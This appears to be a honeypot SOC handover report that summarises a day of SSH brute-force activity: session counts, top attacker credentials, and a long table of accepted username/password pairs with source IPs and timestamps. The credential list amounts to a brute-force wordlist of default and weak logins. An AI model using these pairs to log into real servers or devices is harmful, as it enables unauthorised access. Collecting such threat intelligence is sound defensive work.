# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-11 |
| **Generated At** | 2026-08-11T10:54:49Z |
| **Shift Time** | 10:54 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **1004** |
| Confirmed Threats | **911** |
| False Positives Filtered | **93** (9.3%) |
| Unique Attacker IPs | **266** |
| Countries of Origin | **51** |
| High Severity Cases | **361** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **643** |
| Malware Samples Analyzed | **3** HIGH · **23** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **421** |
| Unique Credential Pairs | **259** |
| Unique Usernames | **72** |
| Unique Passwords | **164** |
| Successful Auth Pairs | **361** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 130 |
| `admin` | 48 |
| `support` | 38 |
| `config` | 18 |
| `debian` | 15 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `support` | 18 |
| `123456` | 14 |
| `123` | 14 |
| `LeitboGi0ro` | 11 |
| `admin` | 11 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 18 |
| `root` | `LeitboGi0ro` | 11 |
| `root` | `123@@@` | 10 |
| `root` | `smo@@kkklss` | 10 |
| `admin` | `admin` | 8 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `support` | `support` | `176.53.159.196` | 2026-08-11T00:00:40 |
| `user` | `admin123` | `219.129.96.2` | 2026-08-11T00:00:41 |
| `user` | `admin123` | `218.202.143.68` | 2026-08-11T00:00:49 |
| `admin` | `88888` | `10.0.0.73` | 2026-08-11T00:01:12 |
| `admin` | `88888` | `211.223.41.90` | 2026-08-11T00:02:53 |
| `root` | `Abcd123456` | `130.12.180.51` | 2026-08-11T00:05:30 |
| `operator` | `operator0` | `10.0.0.73` | 2026-08-11T00:05:44 |
| `root` | `123@@@` | `152.67.96.249` | 2026-08-11T00:07:54 |
| `root` | `LeitboGi0ro` | `152.67.96.249` | 2026-08-11T00:07:55 |
| `admin` | `88888` | `124.152.90.68` | 2026-08-11T00:19:02 |
| `admin` | `88888` | `113.28.86.1` | 2026-08-11T00:19:11 |
| `support` | `support` | `10.0.0.73` | 2026-08-11T00:24:06 |
| `root` | `` | `94.154.43.144` | 2026-08-11T00:26:17 |
| `root` | `!root` | `92.118.39.71` | 2026-08-11T00:35:08 |
| `centos` | `P@ssword` | `10.0.0.73` | 2026-08-11T00:35:31 |
| `root` | `111111` | `92.118.39.71` | 2026-08-11T00:37:47 |
| `blank` | `123qwe` | `10.0.0.73` | 2026-08-11T00:39:41 |
| `root` | `123123` | `92.118.39.71` | 2026-08-11T00:40:41 |
| `root` | `1234` | `92.118.39.71` | 2026-08-11T00:43:15 |
| `root` | `12345` | `92.118.39.71` | 2026-08-11T00:45:46 |
| `Admin` | `444444` | `10.0.0.73` | 2026-08-11T00:46:27 |
| `root` | `123@@@` | `129.153.145.135` | 2026-08-11T00:49:53 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-08-11T00:49:54 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-08-11T00:50:02 |
| `root` | `12345678` | `92.118.39.71` | 2026-08-11T00:50:11 |
| `root` | `123456789` | `92.118.39.71` | 2026-08-11T00:52:23 |
| `centos` | `P@ssword` | `60.223.250.50` | 2026-08-11T00:53:11 |
| `centos` | `P@ssword` | `65.20.133.56` | 2026-08-11T00:53:18 |
| `root` | `P@ssw0rd` | `92.118.39.71` | 2026-08-11T00:54:20 |
| `pi` | `abcd1234` | `10.0.0.73` | 2026-08-11T00:55:17 |
| `blank` | `123qwe` | `49.124.133.102` | 2026-08-11T00:58:24 |
| `root` | `Password1` | `92.118.39.71` | 2026-08-11T01:00:44 |
| `root` | `Root123` | `92.118.39.71` | 2026-08-11T01:03:15 |
| `root` | `admin` | `92.118.39.71` | 2026-08-11T01:06:14 |
| `nobody` | `1q2w3e` | `121.178.185.141` | 2026-08-11T01:09:03 |
| `test` | `p@ssw0rd` | `10.0.0.73` | 2026-08-11T01:09:24 |
| `root` | `admin123` | `92.118.39.71` | 2026-08-11T01:10:57 |
| `test` | `p@ssw0rd` | `211.184.53.155` | 2026-08-11T01:11:09 |
| `test` | `p@ssw0rd` | `153.37.177.219` | 2026-08-11T01:11:18 |
| `blank` | `password` | `10.0.0.73` | 2026-08-11T01:13:41 |
| `root` | `alpine` | `92.118.39.71` | 2026-08-11T01:22:44 |
| `test` | `p@ssw0rd` | `122.170.99.195` | 2026-08-11T01:27:29 |
| `root` | `changeme` | `92.118.39.71` | 2026-08-11T01:29:38 |
| `root` | `ubuntu` | `154.241.31.235` | 2026-08-11T01:33:52 |
| `nobody` | `1q2w3e` | `117.247.239.202` | 2026-08-11T01:37:51 |
| `root` | `default` | `92.118.39.71` | 2026-08-11T01:38:27 |
| `test` | `p@ssword` | `78.187.9.111` | 2026-08-11T01:42:58 |
| `dns` | `dns` | `10.0.0.73` | 2026-08-11T01:43:45 |
| `dns` | `dns` | `60.166.8.174` | 2026-08-11T01:45:24 |
| `dns` | `dns` | `59.46.182.10` | 2026-08-11T01:45:39 |
| `root` | `letmein` | `92.118.39.71` | 2026-08-11T01:45:42 |
| `admin` | `MODEMadmin` | `10.0.0.73` | 2026-08-11T01:48:05 |
| `test` | `p@ssword` | `10.0.0.73` | 2026-08-11T01:54:38 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-11T01:55:53 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-11T01:55:53 |
| `test` | `p@ssword` | `197.251.193.6` | 2026-08-11T02:11:46 |
| `test` | `p@ssword` | `34.41.211.48` | 2026-08-11T02:11:52 |
| `admin` | `passw0rd` | `10.0.0.73` | 2026-08-11T02:18:06 |
| `root` | `---fuck_you----` | `182.92.204.91` | 2026-08-11T02:18:30 |
| `admin` | `passw0rd` | `213.55.79.195` | 2026-08-11T02:35:57 |
| `root` | `ubuntu` | `185.221.21.17` | 2026-08-11T02:37:27 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `130.211.76.1` | 2026-08-11T02:49:29 |
| `*1` | `$4` | `130.211.76.1` | 2026-08-11T02:49:38 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 4883` | `130.211.76.1` | 2026-08-11T02:49:40 |
| `support` | `911911` | `14.54.22.11` | 2026-08-11T02:51:11 |
| `config` | `123654` | `10.0.0.73` | 2026-08-11T02:52:11 |
| `config` | `123654` | `124.160.45.26` | 2026-08-11T02:53:52 |
| `support` | `911911` | `10.0.0.73` | 2026-08-11T03:02:52 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.77.50.133` | 2026-08-11T03:03:15 |
| `*1` | `$4` | `34.77.50.133` | 2026-08-11T03:03:28 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 1686` | `34.77.50.133` | 2026-08-11T03:03:30 |
| `admin` | `admin` | `147.139.136.75` | 2026-08-11T03:09:48 |
| `admin` | `admin` | `130.12.180.51` | 2026-08-11T03:09:49 |
| `config` | `123654` | `178.178.194.131` | 2026-08-11T03:10:00 |
| `config` | `123654` | `210.0.90.82` | 2026-08-11T03:10:09 |
| `admin` | `Admin11` | `122.170.111.140` | 2026-08-11T03:14:48 |
| `admin` | `Admin11` | `220.134.25.203` | 2026-08-11T03:15:06 |
| `root` | `123@@@` | `140.245.50.204` | 2026-08-11T03:24:11 |
| `root` | `LeitboGi0ro` | `140.245.50.204` | 2026-08-11T03:24:11 |
| `root` | `smo@@kkklss` | `140.245.50.204` | 2026-08-11T03:24:16 |
| `debian` | `marketing` | `45.178.227.0` | 2026-08-11T03:25:25 |
| `admin` | `admin` | `39.107.142.38` | 2026-08-11T03:25:57 |
| `support` | `test12345` | `10.0.0.73` | 2026-08-11T03:26:34 |
| `support` | `test12345` | `220.189.209.18` | 2026-08-11T03:28:09 |
| `support` | `test12345` | `85.19.195.12` | 2026-08-11T03:28:15 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.76.72.104` | 2026-08-11T03:39:17 |
| `*1` | `$4` | `34.76.72.104` | 2026-08-11T03:39:30 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 8445` | `34.76.72.104` | 2026-08-11T03:39:32 |
| `support` | `test12345` | `59.8.2.70` | 2026-08-11T03:44:22 |
| `support` | `test12345` | `220.178.246.43` | 2026-08-11T03:44:32 |
| `config` | `123321` | `218.206.136.24` | 2026-08-11T03:49:06 |
| `config` | `123321` | `65.20.187.47` | 2026-08-11T03:49:14 |
| `config` | `abcd1234` | `177.174.89.99` | 2026-08-11T03:59:39 |
| `support` | `P@ssw0rd` | `10.0.0.73` | 2026-08-11T04:00:43 |
| `support` | `P@ssw0rd` | `71.229.1.186` | 2026-08-11T04:02:18 |
| `support` | `P@ssw0rd` | `196.216.81.126` | 2026-08-11T04:02:26 |
| `config` | `abcd1234` | `10.0.0.73` | 2026-08-11T04:11:06 |
| `support` | `123abc` | `210.13.99.66` | 2026-08-11T04:23:21 |
| `root` | `ciaociao` | `183.88.232.183` | 2026-08-11T04:28:01 |
| `345gs5662d34` | `345gs5662d34` | `183.88.232.183` | 2026-08-11T04:28:05 |
| `root` | `3245gs5662d34` | `183.88.232.183` | 2026-08-11T04:28:07 |
| `config` | `abcd1234` | `190.12.109.162` | 2026-08-11T04:28:35 |
| `admin` | `admin123!` | `165.154.6.75` | 2026-08-11T04:32:21 |
| `345gs5662d34` | `345gs5662d34` | `165.154.6.75` | 2026-08-11T04:32:25 |
| `admin` | `3245gs5662d34` | `165.154.6.75` | 2026-08-11T04:32:26 |
| `unknown` | `123` | `218.23.95.14` | 2026-08-11T04:33:40 |
| `unknown` | `123` | `59.93.36.136` | 2026-08-11T04:33:49 |
| `centos` | `Passw@rd` | `10.0.0.73` | 2026-08-11T04:35:01 |
| `centos` | `Passw@rd` | `217.24.185.98` | 2026-08-11T04:36:37 |
| `centos` | `Passw@rd` | `65.20.237.119` | 2026-08-11T04:52:58 |
| `centos` | `Passw@rd` | `178.178.194.137` | 2026-08-11T04:53:09 |
| `blank` | `admin123` | `77.106.78.215` | 2026-08-11T04:57:27 |
| `unknown` | `123` | `111.70.10.15` | 2026-08-11T05:02:36 |
| `unknown` | `123` | `178.178.194.135` | 2026-08-11T05:02:44 |
| `adminpldt` | `1234567890` | `10.0.0.73` | 2026-08-11T05:09:24 |
| `adminpldt` | `1234567890` | `179.181.133.153` | 2026-08-11T05:11:02 |
| `root` | `﻿------fuck------` | `121.228.250.70` | 2026-08-11T05:18:39 |
| `root` | `!root` | `195.178.110.228` | 2026-08-11T05:18:52 |
| `root` | `111111` | `195.178.110.228` | 2026-08-11T05:20:31 |
| `admin` | `admin` | `47.85.164.184` | 2026-08-11T05:20:53 |
| `root` | `123123` | `195.178.110.228` | 2026-08-11T05:22:14 |
| `root` | `123321` | `195.178.110.228` | 2026-08-11T05:24:02 |
| `root` | `1234` | `195.178.110.228` | 2026-08-11T05:25:48 |
| `adminpldt` | `1234567890` | `200.105.141.172` | 2026-08-11T05:27:29 |
| `root` | `12345` | `195.178.110.228` | 2026-08-11T05:27:29 |
| `root` | `1234567` | `195.178.110.228` | 2026-08-11T05:31:00 |
| `user` | `administrator` | `117.247.239.202` | 2026-08-11T05:31:52 |
| `root` | `12345678` | `195.178.110.228` | 2026-08-11T05:32:52 |
| `root` | `123456789` | `195.178.110.228` | 2026-08-11T05:34:43 |
| `root` | `1234567890` | `195.178.110.228` | 2026-08-11T05:36:36 |
| `root` | `123456a` | `195.178.110.228` | 2026-08-11T05:38:29 |
| `root` | `123456b` | `195.178.110.228` | 2026-08-11T05:40:23 |
| `root` | `1234abcd` | `195.178.110.228` | 2026-08-11T05:42:21 |
| `root` | `123abc` | `195.178.110.228` | 2026-08-11T05:44:18 |
| `"??$` | `$#7?9>7?>` | `14.33.48.192` | 2026-08-11T05:46:05 |
| `root` | `123qwe` | `195.178.110.228` | 2026-08-11T05:46:20 |
| `b'\xcc\xd1\xd1\xca'` | `b'\xcc\xd1\xd1\xca'` | `14.33.48.192` | 2026-08-11T05:46:38 |
| `lghkel	` | `zpz}ld	` | `14.33.48.192` | 2026-08-11T05:46:39 |
| `root` | `cat1029` | `14.33.48.192` | 2026-08-11T05:47:13 |
| `config` | `123456789` | `10.0.0.73` | 2026-08-11T05:47:23 |
| `admin` | `motorola` | `14.33.48.192` | 2026-08-11T05:47:47 |
| `root` | `1q2w3e4r` | `195.178.110.228` | 2026-08-11T05:48:21 |
| `user` | `user` | `14.33.48.192` | 2026-08-11T05:48:21 |
| `"??$` | `e``` | `14.33.48.192` | 2026-08-11T05:48:57 |
| `default` | `tlJwpbo6` | `14.33.48.192` | 2026-08-11T05:49:31 |
| `admin` | `epicrouter` | `14.33.48.192` | 2026-08-11T05:50:05 |
| `root` | `1qaz2wsx` | `195.178.110.228` | 2026-08-11T05:50:19 |
| `b'\xdf\xda\xd3\xd7\xd0'` | `b'\x8f\x8f\x8f\x8f'` | `14.33.48.192` | 2026-08-11T05:50:39 |
| `b'\xd9\xcb\xdb\xcd\xca'` | `b'\x8f\x8f\x8f\x8f'` | `14.33.48.192` | 2026-08-11T05:51:13 |
| `root` | `1qaz@WSX` | `195.178.110.228` | 2026-08-11T05:52:17 |
| `centos` | `qwerty12` | `10.0.0.73` | 2026-08-11T05:53:47 |
| `root` | `21` | `195.178.110.228` | 2026-08-11T05:54:18 |
| `root` | `321` | `195.178.110.228` | 2026-08-11T05:56:22 |
| `root` | `4321` | `195.178.110.228` | 2026-08-11T05:58:21 |
| `root` | `54321` | `195.178.110.228` | 2026-08-11T06:00:23 |
| `blank` | `0987654321` | `213.33.204.130` | 2026-08-11T06:01:46 |
| `root` | `555555` | `195.178.110.228` | 2026-08-11T06:02:21 |
| `root` | `654321` | `195.178.110.228` | 2026-08-11T06:04:16 |
| `root` | `7777777` | `195.178.110.228` | 2026-08-11T06:06:12 |
| `root` | `Admin2026!` | `195.178.110.228` | 2026-08-11T06:08:11 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `152.32.208.9` | 2026-08-11T06:15:48 |
| `b'\x05\x04\x00\x01\x02\x80\x05\x01\x00\x03'` | `github.com PGET / HTTP/1.0` | `152.32.208.9` | 2026-08-11T06:16:07 |
| `Admin` | `Password1` | `196.219.93.98` | 2026-08-11T06:19:47 |
| `Admin` | `Password1` | `61.169.54.150` | 2026-08-11T06:19:56 |
| `root` | `﻿------fuck------` | `10.0.0.73` | 2026-08-11T06:23:29 |
| `admin` | `admin` | `34.78.185.249` | 2026-08-11T06:25:17 |
| `blank` | `qwerty12345` | `10.0.0.73` | 2026-08-11T06:28:19 |
| `Admin` | `Password1` | `60.251.229.144` | 2026-08-11T06:36:26 |
| `Admin` | `Password1` | `203.252.10.4` | 2026-08-11T06:36:34 |
| `support` | `121212` | `121.189.226.81` | 2026-08-11T06:40:39 |
| `support` | `121212` | `101.13.1.58` | 2026-08-11T06:40:53 |
| `blank` | `qwerty12345` | `177.159.150.111` | 2026-08-11T06:45:31 |
| `blank` | `qwerty12345` | `122.187.234.54` | 2026-08-11T06:45:40 |
| `root` | `000000` | `80.94.92.234` | 2026-08-11T06:55:23 |
| `root` | `111111` | `80.94.92.234` | 2026-08-11T06:57:38 |
| `root` | `123` | `80.94.92.234` | 2026-08-11T06:59:57 |
| `root` | `123123` | `80.94.92.234` | 2026-08-11T07:02:02 |
| `root` | `1234` | `80.94.92.234` | 2026-08-11T07:04:14 |
| `root` | `12345` | `80.94.92.234` | 2026-08-11T07:06:26 |
| `user` | `passwd` | `182.156.80.11` | 2026-08-11T07:10:40 |
| `root` | `12345678` | `80.94.92.234` | 2026-08-11T07:10:41 |
| `user` | `passwd` | `111.42.175.101` | 2026-08-11T07:10:53 |
| `root` | `123456789` | `80.94.92.234` | 2026-08-11T07:12:51 |
| `config` | `marketing` | `178.178.194.151` | 2026-08-11T07:14:46 |
| `config` | `marketing` | `49.124.142.137` | 2026-08-11T07:14:55 |
| `root` | `1q2w3e4r` | `80.94.92.234` | 2026-08-11T07:15:00 |
| `root` | `654321` | `80.94.92.234` | 2026-08-11T07:17:12 |
| `root` | `P@ssw0rd` | `80.94.92.234` | 2026-08-11T07:19:19 |
| `root` | `admin` | `80.94.92.234` | 2026-08-11T07:21:29 |
| `root` | `admin123` | `80.94.92.234` | 2026-08-11T07:23:36 |
| `support` | `raspberry` | `220.180.166.214` | 2026-08-11T07:25:05 |
| `root` | `passw0rd` | `80.94.92.234` | 2026-08-11T07:25:42 |
| `config` | `qwerty1234` | `10.0.0.73` | 2026-08-11T07:27:20 |
| `root` | `password` | `80.94.92.234` | 2026-08-11T07:27:46 |
| `root` | `Zxc123!@#` | `124.70.97.100` | 2026-08-11T07:29:27 |
| `345gs5662d34` | `345gs5662d34` | `124.70.97.100` | 2026-08-11T07:29:38 |
| `root` | `password1` | `80.94.92.234` | 2026-08-11T07:29:48 |
| `root` | `qwerty` | `80.94.92.234` | 2026-08-11T07:31:50 |
| `root` | `root123` | `80.94.92.234` | 2026-08-11T07:33:54 |
| `root` | `toor` | `80.94.92.234` | 2026-08-11T07:35:59 |
| `support` | `raspberry` | `10.0.0.73` | 2026-08-11T07:36:48 |
| `admin` | `000000` | `80.94.92.234` | 2026-08-11T07:38:15 |
| `admin` | `111111` | `80.94.92.234` | 2026-08-11T07:40:38 |
| `admin` | `123` | `80.94.92.234` | 2026-08-11T07:42:50 |
| `admin` | `123123` | `80.94.92.234` | 2026-08-11T07:44:49 |
| `admin` | `1234` | `80.94.92.234` | 2026-08-11T07:46:46 |
| `admin` | `12345` | `80.94.92.234` | 2026-08-11T07:48:47 |
| `config` | `1234567890` | `37.46.160.175` | 2026-08-11T07:49:03 |
| `config` | `1234567890` | `85.105.255.56` | 2026-08-11T07:49:13 |
| `admin` | `123456` | `80.94.92.234` | 2026-08-11T07:50:40 |
| `admin` | `1234567` | `80.94.92.234` | 2026-08-11T07:53:16 |
| `support` | `raspberry` | `210.4.68.72` | 2026-08-11T07:54:06 |
| `admin` | `12345678` | `80.94.92.234` | 2026-08-11T07:55:20 |
| `admin` | `123456789` | `80.94.92.234` | 2026-08-11T07:58:06 |
| `test` | `123qwe` | `65.20.175.6` | 2026-08-11T07:59:26 |
| `admin` | `admin` | `107.173.67.180` | 2026-08-11T07:59:36 |
| `admin` | `1q2w3e4r` | `80.94.92.234` | 2026-08-11T08:00:12 |
| `root` | `---fuck_you----` | `58.35.165.225` | 2026-08-11T08:00:26 |
| `debian` | `qwer1234` | `10.0.0.73` | 2026-08-11T08:01:36 |
| `admin` | `654321` | `80.94.92.234` | 2026-08-11T08:02:18 |
| `admin` | `Admin123` | `80.94.92.234` | 2026-08-11T08:04:26 |
| `debian` | `888` | `10.0.0.73` | 2026-08-11T08:04:32 |
| `admin` | `P@ssw0rd` | `80.94.92.234` | 2026-08-11T08:06:23 |
| `admin` | `admin` | `80.94.92.234` | 2026-08-11T08:08:35 |
| `admin` | `passw0rd` | `80.94.92.234` | 2026-08-11T08:10:33 |
| `admin` | `password` | `80.94.92.234` | 2026-08-11T08:13:04 |
| `admin` | `password1` | `80.94.92.234` | 2026-08-11T08:15:01 |
| `admin` | `qwerty` | `80.94.92.234` | 2026-08-11T08:17:12 |
| `admin1` | `123123` | `80.94.92.234` | 2026-08-11T08:19:14 |
| `admin1` | `12345` | `80.94.92.234` | 2026-08-11T08:21:21 |
| `sinusbot` | `root` | `12.156.67.18` | 2026-08-11T08:23:27 |
| `345gs5662d34` | `345gs5662d34` | `12.156.67.18` | 2026-08-11T08:23:29 |
| `sinusbot` | `3245gs5662d34` | `12.156.67.18` | 2026-08-11T08:23:30 |
| `admin1` | `123456` | `80.94.92.234` | 2026-08-11T08:24:15 |
| `admin1` | `password` | `80.94.92.234` | 2026-08-11T08:26:11 |
| `administrator` | `123123` | `80.94.92.234` | 2026-08-11T08:28:53 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `172.104.11.34` | 2026-08-11T08:29:48 |
| `administrator` | `12345` | `80.94.92.234` | 2026-08-11T08:30:44 |
| `administrator` | `123456` | `80.94.92.234` | 2026-08-11T08:32:58 |
| `config` | `Passw@rd` | `35.130.111.98` | 2026-08-11T08:33:35 |
| `administrator` | `1234567` | `80.94.92.234` | 2026-08-11T08:35:17 |
| `debian` | `22222222` | `10.0.0.73` | 2026-08-11T08:36:12 |
| `administrator` | `12345678` | `80.94.92.234` | 2026-08-11T08:37:19 |
| `debian` | `22222222` | `112.161.26.125` | 2026-08-11T08:37:46 |
| `debian` | `22222222` | `101.13.4.124` | 2026-08-11T08:37:59 |
| `nobody` | `nobody2020` | `10.0.0.73` | 2026-08-11T08:38:56 |
| `administrator` | `123456789` | `80.94.92.234` | 2026-08-11T08:39:56 |
| `administrator` | `password` | `80.94.92.234` | 2026-08-11T08:42:01 |
| `apache` | `12345678` | `80.94.92.234` | 2026-08-11T08:44:19 |
| `administrator` | `123abc` | `91.92.47.140` | 2026-08-11T08:45:45 |
| `runner` | `runner` | `91.92.47.140` | 2026-08-11T08:45:52 |
| `guest` | `abc123` | `91.92.47.140` | 2026-08-11T08:45:57 |
| `ob` | `ob` | `91.92.47.140` | 2026-08-11T08:46:02 |
| `admin` | `passw0rd` | `91.92.47.140` | 2026-08-11T08:46:07 |
| `debian` | `abc123` | `91.92.47.140` | 2026-08-11T08:46:13 |
| `ec2-user` | `123456` | `91.92.47.140` | 2026-08-11T08:46:18 |
| `root` | `123` | `91.92.47.140` | 2026-08-11T08:46:23 |
| `apache` | `password` | `80.94.92.234` | 2026-08-11T08:46:23 |
| `root` | `IORqDJCRuw` | `91.92.47.140` | 2026-08-11T08:46:28 |
| `administrator` | `123` | `91.92.47.140` | 2026-08-11T08:46:34 |
| `root` | `root12` | `91.92.47.140` | 2026-08-11T08:46:39 |
| `admin1` | `password1` | `91.92.47.140` | 2026-08-11T08:46:44 |
| `trade` | `123456` | `91.92.47.140` | 2026-08-11T08:46:49 |
| `guest` | `guest123` | `91.92.47.140` | 2026-08-11T08:46:55 |
| `root` | `baidu123` | `91.92.47.140` | 2026-08-11T08:47:00 |
| `ubnt` | `ubntubnt` | `91.92.47.140` | 2026-08-11T08:47:05 |
| `aidan` | `aidan` | `91.92.47.140` | 2026-08-11T08:47:10 |
| `dev` | `123321` | `91.92.47.140` | 2026-08-11T08:47:16 |
| `support` | `support12` | `91.92.47.140` | 2026-08-11T08:47:21 |
| `guest` | `pi` | `91.92.47.140` | 2026-08-11T08:47:26 |
| `esroot` | `esroot` | `91.92.47.140` | 2026-08-11T08:47:31 |
| `supervisor` | `root` | `91.92.47.140` | 2026-08-11T08:47:36 |
| `water` | `water123` | `91.92.47.140` | 2026-08-11T08:47:42 |
| `coder` | `123456` | `91.92.47.140` | 2026-08-11T08:47:47 |
| `postgres` | `123` | `91.92.47.140` | 2026-08-11T08:47:52 |
| `root` | `P4ssw0rd` | `91.92.47.140` | 2026-08-11T08:47:57 |
| `deployer` | `deployer` | `91.92.47.140` | 2026-08-11T08:48:02 |
| `support` | `qaz123wsx` | `91.92.47.140` | 2026-08-11T08:48:07 |
| `debian` | `qwerty123` | `91.92.47.140` | 2026-08-11T08:48:12 |
| `bob` | `root` | `91.92.47.140` | 2026-08-11T08:48:17 |
| `user` | `password` | `91.92.47.140` | 2026-08-11T08:48:22 |
| `root` | `321` | `91.92.47.140` | 2026-08-11T08:48:27 |
| `newuser` | `123456` | `91.92.47.140` | 2026-08-11T08:48:32 |
| `apache` | `password` | `91.92.47.140` | 2026-08-11T08:48:37 |
| `odoo` | `123` | `91.92.47.140` | 2026-08-11T08:48:42 |
| `user` | `111` | `91.92.47.140` | 2026-08-11T08:48:47 |
| `root` | `11111111` | `91.92.47.140` | 2026-08-11T08:48:53 |
| `root` | `Ab123456` | `91.92.47.140` | 2026-08-11T08:48:58 |
| `administrator` | `1234` | `91.92.47.140` | 2026-08-11T08:49:03 |
| `backup` | `123` | `80.94.92.234` | 2026-08-11T08:49:05 |
| `admin` | `1qaz@WSX` | `91.92.47.140` | 2026-08-11T08:49:08 |
| `ubuntu` | `ubuntu1234` | `91.92.47.140` | 2026-08-11T08:49:13 |
| `admin` | `Admin12345` | `91.92.47.140` | 2026-08-11T08:49:18 |
| `zabbix` | `123456` | `91.92.47.140` | 2026-08-11T08:49:23 |
| `unknown` | `44444` | `91.92.47.140` | 2026-08-11T08:49:28 |
| `deploy` | `password` | `91.92.47.140` | 2026-08-11T08:49:33 |
| `zimbra` | `zimbra` | `91.92.47.140` | 2026-08-11T08:49:38 |
| `root` | `root123456` | `91.92.47.140` | 2026-08-11T08:49:43 |
| `martin` | `123456` | `91.92.47.140` | 2026-08-11T08:49:48 |
| `deploy` | `1q2w3e4r` | `91.92.47.140` | 2026-08-11T08:49:53 |
| `root` | `1qazxsw2` | `91.92.47.140` | 2026-08-11T08:49:58 |
| `root` | `faanwAgoFf` | `91.92.47.140` | 2026-08-11T08:50:03 |
| `dev` | `12345` | `91.92.47.140` | 2026-08-11T08:50:09 |
| `guest` | `qwerty1` | `91.92.47.140` | 2026-08-11T08:50:14 |
| `root` | `root77` | `91.92.47.140` | 2026-08-11T08:50:19 |
| `developer` | `123456789` | `91.92.47.140` | 2026-08-11T08:50:24 |
| `apache` | `admin` | `91.92.47.140` | 2026-08-11T08:50:30 |
| `admin1` | `admin123` | `91.92.47.140` | 2026-08-11T08:50:35 |
| `azureuser` | `12345` | `91.92.47.140` | 2026-08-11T08:50:40 |
| `gabriel` | `gabriel` | `91.92.47.140` | 2026-08-11T08:50:45 |
| `root` | `abcd@1234` | `91.92.47.140` | 2026-08-11T08:50:51 |
| `root` | `system` | `91.92.47.140` | 2026-08-11T08:50:56 |
| `root` | `1234567` | `91.92.47.140` | 2026-08-11T08:51:01 |
| `test` | `12345678` | `91.92.47.140` | 2026-08-11T08:51:06 |
| `root` | `1` | `91.92.47.140` | 2026-08-11T08:51:12 |
| `administrator` | `admin123` | `91.92.47.140` | 2026-08-11T08:51:17 |
| `app` | `app` | `91.92.47.140` | 2026-08-11T08:51:23 |
| `devuser` | `devuser` | `91.92.47.140` | 2026-08-11T08:51:28 |
| `bernard` | `bernard` | `91.92.47.140` | 2026-08-11T08:51:33 |
| `developer` | `12345678` | `91.92.47.140` | 2026-08-11T08:51:39 |
| `hduser` | `hduser` | `91.92.47.140` | 2026-08-11T08:51:44 |
| `chenxi` | `123456` | `91.92.47.140` | 2026-08-11T08:51:48 |
| `debian` | `123456` | `91.92.47.140` | 2026-08-11T08:51:54 |
| `runner` | `123` | `91.92.47.140` | 2026-08-11T08:51:59 |
| `grid` | `grid` | `91.92.47.140` | 2026-08-11T08:52:04 |
| `admin` | `admin@123` | `91.92.47.140` | 2026-08-11T08:52:09 |
| `admin1` | `1234` | `91.92.47.140` | 2026-08-11T08:52:14 |
| `user3` | `user3` | `91.92.47.140` | 2026-08-11T08:52:20 |
| `samuel` | `a` | `91.92.47.140` | 2026-08-11T08:52:25 |
| `odoo16` | `odoo16` | `91.92.47.140` | 2026-08-11T08:52:30 |
| `root` | `q1w2e3R$` | `91.92.47.140` | 2026-08-11T08:52:36 |
| `postgres` | `1` | `91.92.47.140` | 2026-08-11T08:52:41 |
| `user` | `user1234` | `91.92.47.140` | 2026-08-11T08:52:46 |
| `root` | `root1` | `91.92.47.140` | 2026-08-11T08:52:51 |
| `root` | `r00t` | `91.92.47.140` | 2026-08-11T08:52:56 |
| `root` | `helloworld` | `91.92.47.140` | 2026-08-11T08:53:01 |
| `dev` | `abc123` | `91.92.47.140` | 2026-08-11T08:53:07 |
| `jellyfin` | `123` | `91.92.47.140` | 2026-08-11T08:53:12 |
| `root` | `1qazXSW@` | `91.92.47.140` | 2026-08-11T08:53:18 |
| `crafty` | `crafty` | `91.92.47.140` | 2026-08-11T08:53:23 |
| `root` | `qwe123!@#` | `91.92.47.140` | 2026-08-11T08:53:28 |
| `user` | `rootroot` | `91.92.47.140` | 2026-08-11T08:53:33 |
| `developer` | `1` | `91.92.47.140` | 2026-08-11T08:53:39 |
| `admin` | `!QAZ2wsx` | `91.92.47.140` | 2026-08-11T08:53:44 |
| `sam` | `123456789` | `91.92.47.140` | 2026-08-11T08:53:49 |
| `administrator` | `1q2w3e4r` | `91.92.47.140` | 2026-08-11T08:53:54 |
| `gitlab-runner` | `passwd` | `91.92.47.140` | 2026-08-11T08:54:00 |
| `ubuntu` | `admin@123` | `91.92.47.140` | 2026-08-11T08:54:05 |
| `git` | `123` | `91.92.47.140` | 2026-08-11T08:54:11 |
| `root` | `asdfasdf-space` | `91.92.47.140` | 2026-08-11T08:54:16 |
| `debian` | `22222222` | `176.170.1.244` | 2026-08-11T08:54:17 |
| `debian` | `pass123` | `91.92.47.140` | 2026-08-11T08:54:21 |
| `config` | `config` | `91.92.47.140` | 2026-08-11T08:54:26 |
| `debian` | `22222222` | `187.126.105.42` | 2026-08-11T08:54:27 |
| `admin` | `admin1234` | `91.92.47.140` | 2026-08-11T08:54:31 |
| `admin` | `16071984` | `91.92.47.140` | 2026-08-11T08:54:36 |
| `administrator` | `administrator` | `91.92.47.140` | 2026-08-11T08:54:41 |
| `dev` | `123456789` | `91.92.47.140` | 2026-08-11T08:54:46 |
| `student` | `student123` | `91.92.47.140` | 2026-08-11T08:54:51 |
| `ubuntu` | `root` | `91.92.47.140` | 2026-08-11T08:54:56 |
